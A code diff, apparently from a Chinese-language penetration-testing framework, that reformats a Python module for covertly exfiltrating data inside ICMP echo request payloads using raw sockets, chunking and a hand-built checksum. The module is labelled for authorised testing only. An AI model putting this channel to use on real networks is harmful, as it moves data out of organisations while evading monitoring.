@@ -9,14 +9,14 @@ ATT&CK Technique: T1095 - Non-Application Layer Protocol
 Warning: 仅限授权渗透测试使用！
 """
 
-from typing import Optional
 import logging
 import struct
+from typing import Optional
 
 from ..base import (
     BaseExfiltration,
-    ExfilConfig,
     ExfilChannel,
+    ExfilConfig,
     ExfilStatus,
 )
 
@@ -34,8 +34,8 @@ class ICMPExfiltration(BaseExfiltration):
     Warning: 仅限授权渗透测试使用！
     """
 
-    name = 'icmp_exfil'
-    description = 'ICMP Exfiltration Channel'
+    name = "icmp_exfil"
+    description = "ICMP Exfiltration Channel"
     channel = ExfilChannel.ICMP
 
     # ICMP Echo Request 类型
@@ -52,26 +52,23 @@ class ICMPExfiltration(BaseExfiltration):
     def connect(self) -> bool:
         """创建原始套接字"""
         try:
-            import socket
             import os
+            import socket
 
             # 需要 root 权限
-            if os.name != 'nt' and os.geteuid() != 0:
+            if os.name != "nt" and os.geteuid() != 0:
                 self.logger.error("ICMP exfiltration requires root privileges")
                 return False
 
             # 创建原始套接字
-            self._socket = socket.socket(
-                socket.AF_INET,
-                socket.SOCK_RAW,
-                socket.IPPROTO_ICMP
-            )
+            self._socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
 
             # 设置超时
             self._socket.settimeout(self.config.timeout)
 
             # 生成 ICMP ID
             import secrets
+
             self._id = secrets.randbelow(65535) + 1
             self._seq = 0
 
@@ -106,7 +103,7 @@ class ICMPExfiltration(BaseExfiltration):
         try:
             # 分割数据以适应 ICMP 负载大小
             for i in range(0, len(data), self.MAX_PAYLOAD):
-                chunk = data[i:i + self.MAX_PAYLOAD]
+                chunk = data[i : i + self.MAX_PAYLOAD]
 
                 # 构建 ICMP 包
                 packet = self._build_icmp_packet(chunk)
@@ -139,13 +136,13 @@ class ICMPExfiltration(BaseExfiltration):
         icmp_seq = self._seq
 
         # 构建头部（校验和暂时为0）
-        header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
+        header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
 
         # 计算校验和
         checksum = self._calculate_checksum(header + payload)
 
         # 重新构建带正确校验和的头部
-        header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
+        header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
 
         return header + payload
 
@@ -161,7 +158,7 @@ class ICMPExfiltration(BaseExfiltration):
         """
         # 补齐为偶数长度
         if len(data) % 2:
-            data += b'\x00'
+            data += b"\x00"
 
         checksum = 0
         for i in range(0, len(data), 2):
@@ -176,4 +173,4 @@ class ICMPExfiltration(BaseExfiltration):
         return ~checksum & 0xFFFF
 
 
-__all__ = ['ICMPExfiltration']
+__all__ = ["ICMPExfiltration"]
